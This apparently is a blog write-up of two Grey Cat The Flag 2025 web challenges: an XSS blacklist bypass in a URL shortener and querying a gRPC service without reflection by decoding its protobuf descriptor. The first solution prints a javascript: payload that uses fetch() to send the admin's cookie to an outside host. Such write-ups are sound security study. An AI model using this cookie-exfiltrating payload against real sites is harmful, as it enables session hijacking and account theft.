---
layout: post
title: Grey Cat The Flag 2025 [Web]
subtitle: XSS to steal admin cookies and interacting with gRPC services even with reflection disabled
tags: [ctf, web, writeup]
thumbnail-img: /assets/img/gctf25.png
author: ad3n
---

Grey Cat The Flag 2025 is one of Asia’s largest international cybersecurity competitions, hosted by NUS Greyhats. It features challenges in web, pwn, crypto and more.

## Oops
- Description : Simple URL shortener. What could go wrong?
- Solves : 116

Looking at `app.py` there is only minimal blacklist implement on the web to prevent xss where it could be easily bypass.

{% highlight python linenos %}
@app.route('/', methods=['GET', 'POST'])
def index():
    message = None
    shortened_url = None
    
    if request.method == 'POST':
        original_url = request.form['original_url']


        url = original_url.lower()
        while "script" in url:
            url = url.replace("script", "")
	.
	.
	.
{% endhighlight %}


Xss payload will be triggered at `redir.html` on url placeholder

{% highlight html linenos %}
<script>
    location.href = "{% raw %}{{url}}{% endraw %}"
</script>
{% endhighlight %}


### Solution

Using Javascript URLs scheme with xss payload to steal the admin cookies when admin visit the suspicious url (shorten url generated).

{% highlight http linenos %}
POST / HTTP/1.1
Host: challs2.nusgreyhats.org:33001
.
.
.
original_url=javascript:%250A(fetch(`https://example.com/?flag=${document.cookie}`))
{% endhighlight %}


![image](/assets/img/webhook.png){: .mx-auto.d-block :}

Flag:`grey{oops_wrong_variable}`

### Reference
- [https://hackerone.com/reports/316319](https://hackerone.com/reports/316319)


---


## Sgrpc
- Description : Can't get hacked if they can't reach it.
- Solves : 71

{: .box-note}
**Note:** I did not manage to solve this challenge. It will be my future reference.

Since this challenge does not provide .proto file and also reflection disabled, it is either build our own .proto file based on source code (not the intended way) or simply dumping the protobuf and build the .proto file based on the information.

{% highlight bash linenos %}
┌──(kali㉿kali)-[~/…/greyctf/web/sgrpc/dist-sgrpc]
└─$ grpcurl -plaintext -protoset-out desc.pb challs.nusgreyhats.org:33202 describe flag.HelloReply
flag.HelloReply is a message:
message HelloReply {
  required string message = 1;
}
 
┌──(kali㉿kali)-[~/…/greyctf/web/sgrpc/dist-sgrpc]
└─$ xxd -p desc.pb                                                                                
0abe010a1b676f6f676c652f70726f746f6275662f656d7074792e70726f
746f120f676f6f676c652e70726f746f62756622070a05456d707479427d
0a13636f6d2e676f6f676c652e70726f746f627566420a456d7074795072
6f746f50015a2e676f6f676c652e676f6c616e672e6f72672f70726f746f
6275662f74797065732f6b6e6f776e2f656d7074797062f80101a2020347
5042aa021e476f6f676c652e50726f746f6275662e57656c6c4b6e6f776e
5479706573620670726f746f330abc030a0a666c61672e70726f746f1204
666c61671a1b676f6f676c652f70726f746f6275662f656d7074792e7072
6f746f22b1010a0b466c616752657175657374123a0a0f66697273745f63
6f6e646974696f6e1802200228093a115472614c614c65526f205472614c
614c61520e6669727374436f6e646974696f6e12330a107365636f6e645f
636f6e646974696f6e18032002280c3a086361666562616265520f736563
6f6e64436f6e646974696f6e12310a0e6c6173745f636f6e646974696f6e
1801200228063a0a33313431353932363534520d6c617374436f6e646974
696f6e221f0a09466c61675265706c7912120a04666c6167180120022809
5204666c616722260a0a48656c6c6f5265706c7912180a076d6573736167
6518012002280952076d657373616765326c0a04466c6167122f0a074765
74466c616712112e666c61672e466c6167526571756573741a0f2e666c61
672e466c61675265706c79220012330a0548656c6c6f12162e676f6f676c
652e70726f746f6275662e456d7074791a102e666c61672e48656c6c6f52
65706c79220042205a1e6374662e6e757367726579686174732e6f72672f
73677270632f666c6167
{% endhighlight %}


The hex from protobuf file retrieved will be decode [here](https://protobuf-decoder.netlify.app/) to get better overview on what the condition are needed to get the flag or use `protoc` tool.

{% highlight bash linenos %}
┌──(kali㉿kali)-[~/…/greyctf/web/sgrpc/dist-sgrpc]
└─$ protoc --decode=google.protobuf.FileDescriptorSet google/protobuf/descriptor.proto < desc.pb  
file {
  name: "google/protobuf/empty.proto"
  package: "google.protobuf"
  message_type {
    name: "Empty"
  }
  options {
    java_package: "com.google.protobuf"
    java_outer_classname: "EmptyProto"
    java_multiple_files: true
    go_package: "google.golang.org/protobuf/types/known/emptypb"
    cc_enable_arenas: true
    objc_class_prefix: "GPB"
    csharp_namespace: "Google.Protobuf.WellKnownTypes"
  }
  syntax: "proto3"
}
file {
  name: "flag.proto"
  package: "flag"
  dependency: "google/protobuf/empty.proto"
  message_type {
    name: "FlagRequest"
    field {
      name: "first_condition"
      number: 2
      label: LABEL_REQUIRED
      type: TYPE_STRING
      default_value: "TraLaLeRo TraLaLa"
      json_name: "firstCondition"
    }
    field {
      name: "second_condition"
      number: 3
      label: LABEL_REQUIRED
      type: TYPE_BYTES
      default_value: "cafebabe"
      json_name: "secondCondition"
    }
    field {
      name: "last_condition"
      number: 1
      label: LABEL_REQUIRED
      type: TYPE_FIXED64
      default_value: "3141592654"
      json_name: "lastCondition"
    }
  }
  message_type {
    name: "FlagReply"
    field {
      name: "flag"
      number: 1
      label: LABEL_REQUIRED
      type: TYPE_STRING
      json_name: "flag"
    }
  }
  message_type {
    name: "HelloReply"
    field {
      name: "message"
      number: 1
      label: LABEL_REQUIRED
      type: TYPE_STRING
      json_name: "message"
    }
  }
  service {
    name: "Flag"
    method {
      name: "GetFlag"
      input_type: ".flag.FlagRequest"
      output_type: ".flag.FlagReply"
      options {
      }
    }
    method {
      name: "Hello"
      input_type: ".google.protobuf.Empty"
      output_type: ".flag.HelloReply"
      options {
      }
    }
  }
  options {
    go_package: "ctf.nusgreyhats.org/sgrpc/flag"
  }
}
{% endhighlight %}


### Solution
From the protobuf we can build the .proto file and request the flag with the conditions needed.

{% highlight bash linenos %}
┌──(kali㉿kali)-[~/…/greyctf/web/sgrpc/dist-sgrpc]
└─$ grpcurl -plaintext -proto flag.proto -d '{"last_condition": "3141592654","first_condition": "TraLaLeRo TraLaLa","second_condition": "Y2FmZWJhYmU="}'  challs.nusgreyhats.org:33202 flag.Flag/GetFlag
{
  "flag": "grey{r3fl3ct_th3_sch3m4}"
}
{% endhighlight %}


Flag:`grey{r3fl3ct_th3_sch3m4}`

### Reference
- The G.O.A.T [vicevirus](https://vicevirus.github.io/)


## Summary

First up, “Oops” was a URL shortener that tried to block XSS by just removing the word “script” easy to get around with a cleverly javascript: payload. When the admin clicked the shortened link, their cookie got sent out, and the flag was in hand. Then came “Sgrpc,” a gRPC service locked down with no reflection and no .proto files. Still, by dumping and decoding the protobuf descriptor, it was possible to piece together the request structure and send the right values to grab the flag.